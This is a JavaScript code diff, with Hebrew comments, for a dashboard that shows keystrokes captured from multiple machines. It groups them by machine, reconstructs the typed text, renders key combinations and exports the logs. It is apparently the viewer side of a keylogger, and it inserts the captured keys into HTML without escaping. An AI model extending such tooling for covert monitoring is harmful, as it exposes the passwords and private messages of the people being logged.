@@ -165,7 +165,7 @@ function applyFilters() {
     }
 
     // סינון לפי תאריכים
-    const itemDate = new Date(item.timestamp);
+    const itemDate = new Date(item.timestamp * 1000);
     if (fromDate && itemDate < fromDate) {
       return false;
     }
@@ -182,7 +182,9 @@ function applyFilters() {
   });
 
   // מיון הנתונים לפי תאריך (מהחדש לישן)
-  filteredData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  filteredData.sort(
+    (a, b) => new Date(b.timestamp * 1000) - new Date(a.timestamp * 1000)
+  );
 
   // איפוס העמוד הנוכחי
   currentPage = 1;
@@ -199,8 +201,8 @@ function processDataIntoGroups(data) {
   let currentGroup = null;
 
   data.forEach((item) => {
-    const timestamp = new Date(item.timestamp);
-    const machine = machines.find((m) => m.machine_id === item.machine_id);
+    const timestamp = new Date(item.timestamp * 1000);
+    const machine = machines.find((m) => m.id === item.machine_id);
     const machineName = machine
       ? machine.name || machine.info?.pc_name || item.machine_id
       : item.machine_id;
@@ -222,7 +224,7 @@ function processDataIntoGroups(data) {
         machine_id: item.machine_id,
         machineName: machineName,
         startTime: timestamp,
-        lastTimestamp: item.timestamp,
+        lastTimestamp: item.timestamp * 1000,
         data: [],
         keyCount: 0,
       };
@@ -236,7 +238,7 @@ function processDataIntoGroups(data) {
       } else {
         currentGroup.data.push(item);
       }
-      currentGroup.lastTimestamp = item.timestamp;
+      currentGroup.lastTimestamp = item.timestamp * 1000;
       currentGroup.keyCount += item.data.length;
     }
   });
@@ -328,26 +330,34 @@ function processSpecialKeys(data) {
 
   return data
     .map((key) => {
-      // Handle special key combinations
+      // Handle key combinations (e.g., <ctrl>+\u05dc)
       if (key.includes("+")) {
         const parts = key.split("+");
-        const mainKey = parts[0];
-        const modifiers = parts.slice(1);
-
         let displayText = "";
 
-        // Add modifiers
-        if (modifiers.includes("<shift>") || modifiers.includes("<shift_r>")) {
-          displayText += '<i class="fas fa-arrow-up"></i> + ';
-        }
-        if (modifiers.includes("^")) {
-          displayText += '<i class="fas fa-keyboard"></i> + ';
-        }
+        // Process each part of the combination
+        parts.forEach((part, index) => {
+          if (part === "<ctrl>" || part === "<ctrl_r>") {
+            displayText +=
+              '<span class="special-key"><i class="fas fa-keyboard"></i> Ctrl</span>';
+          } else if (part === "<shift>" || part === "<shift_r>") {
+            displayText +=
+              '<span class="special-key"><i class="fas fa-arrow-up"></i> Shift</span>';
+          } else if (part === "<alt>" || part === "<alt_r>") {
+            displayText +=
+              '<span class="special-key"><i class="fas fa-exchange-alt"></i> Alt</span>';
+          } else if (part !== "None") {
+            // Regular key or Hebrew character
+            displayText += `<span class="key-press">${part}</span>`;
+          }
 
-        // Add main key
-        displayText += mainKey;
+          // Add + between parts, but not after the last part
+          if (index < parts.length - 1 && parts[index + 1] !== "None") {
+            displayText += " + ";
+          }
+        });
 
-        return `<span class="special-key">${displayText}</span>`;
+        return displayText;
       }
 
       // Handle single special keys
@@ -385,7 +395,7 @@ function processSpecialKeys(data) {
       }
 
       // Regular characters (including Hebrew)
-      return key;
+      return `<span class="key-press">${key}</span>`;
     })
     .join(" ");
 }
@@ -461,13 +471,11 @@ function renderData() {
           ${getOSIcon(machines.find((m) => m.machine_id === group.machine_id))}
         </div>
         <div class="log-entry-title">
-          ${group.machineName}
-          <div><small class="text-muted">${group.machine_id}</small></div>
+          <strong>${group.machineName}</strong>
+          <small class="text-muted d-block">${group.machine_id}</small>
         </div>
         <div class="log-entry-meta">
-          <span>${formatDate(group.startTime)} - ${formatDate(
-      new Date(group.lastTimestamp)
-    )}</span>
+          <span>${formatDate(group.startTime)}</span>
           <span>${group.keyCount} הקשות</span>
           <span>${minutes} דקות, ${seconds} שניות</span>
         </div>
@@ -475,7 +483,9 @@ function renderData() {
       <div class="log-entry-content">
         ${
           viewMode === "raw"
-            ? group.data.map((item) => processSpecialKeys(item.data)).join("")
+            ? `<div class="keystroke-container">${group.data
+                .map((item) => processSpecialKeys(item.data))
+                .join("")}</div>`
             : `<div class="readable-text">${group.data
                 .map((item) => reconstructText(item.data))
                 .join("")}</div>`
@@ -604,60 +614,34 @@ function getOSIcon(machine) {
   }
 }
 
-// הצגת מודאל נתונים
-function showDataModal(item) {
-  // הצגת פרטי המחשב
-  const machine = machines.find((m) => m.machine_id === item.machine_id);
-  const machineName = machine
-    ? machine.name || machine.info?.pc_name || item.machine_id
-    : item.machine_id;
+// פורמט תאריך ושעה
+function formatDate(date) {
+  if (!date) return "";
 
-  document.getElementById("modal-machine-id").textContent = machineName;
-  document.getElementById("modal-machine-code").textContent = item.machine_id;
-  document.getElementById("modal-timestamp").textContent = formatDate(
-    new Date(item.timestamp)
-  );
+  // בדיקה אם התאריך הוא מהיום
+  const today = new Date();
+  const isToday =
+    date.getDate() === today.getDate() &&
+    date.getMonth() === today.getMonth() &&
+    date.getFullYear() === today.getFullYear();
 
-  // הצגת הנתונים הגולמיים
-  document.getElementById("modal-data-content").textContent = JSON.stringify(
-    item.data
-  );
+  // פורמט שעה
+  const hours = date.getHours().toString().padStart(2, "0");
+  const minutes = date.getMinutes().toString().padStart(2, "0");
+  const seconds = date.getSeconds().toString().padStart(2, "0");
+  const timeStr = `${hours}:${minutes}:${seconds}`;
 
-  // הצגת הטקסט המשוחזר
-  const reconstructedText = reconstructText(item.data);
-  document.getElementById("modal-readable-content").innerHTML =
-    reconstructedText;
+  // אם זה היום, נציג רק את השעה
+  if (isToday) {
+    return `<span class="time-display">${timeStr}</span>`;
+  }
 
-  // הגדרת אייקון מחשב
-  document.getElementById("modal-machine-icon").innerHTML = getOSIcon(machine);
+  // אחרת, נציג תאריך ושעה
+  const day = date.getDate().toString().padStart(2, "0");
+  const month = (date.getMonth() + 1).toString().padStart(2, "0");
+  const year = date.getFullYear();
 
-  // הגדרת קישור לדף המחשב
-  document.getElementById(
-    "modal-view-machine"
-  ).href = `machines.html?id=${item.machine_id}`;
-
-  // ניתוח תוכן
-  analyzeData(item.data);
-
-  // הצגת המודאל
-  dataModal.show();
-
-  // הגדרת אירועי העתקה
-  document
-    .getElementById("raw-copy-btn")
-    .addEventListener("click", function () {
-      copyToClipboard(JSON.stringify(item.data), this);
-    });
-
-  document
-    .getElementById("readable-copy-btn")
-    .addEventListener("click", function () {
-      // העתקת הטקסט המשוחזר ללא תגיות HTML
-      const tempDiv = document.createElement("div");
-      tempDiv.innerHTML = reconstructedText;
-      const plainText = tempDiv.textContent || tempDiv.innerText || "";
-      copyToClipboard(plainText, this);
-    });
+  return `<span class="date-display">${day}/${month}/${year}</span> <span class="time-display">${timeStr}</span>`;
 }
 
 // ניתוח תוכן הנתונים
@@ -822,7 +806,7 @@ function initializeEvents() {
       }
 
       const exportData = filteredData.map((item) => {
-        const machine = machines.find((m) => m.machine_id === item.machine_id);
+        const machine = machines.find((m) => m.id === item.machine_id);
         const machineName = machine
           ? machine.name || machine.info?.pc_name || item.machine_id
           : item.machine_id;
@@ -863,8 +847,8 @@ function initializeEvents() {
     let textContent = "";
 
     filteredData.forEach((item) => {
-      const date = formatDate(new Date(item.timestamp));
-      const machine = machines.find((m) => m.machine_id === item.machine_id);
+      const date = formatDate(new Date(item.timestamp * 1000));
+      const machine = machines.find((m) => m.id === item.machine_id);
       const machineName = machine
         ? machine.name || machine.info?.pc_name || item.machine_id
         : item.machine_id;
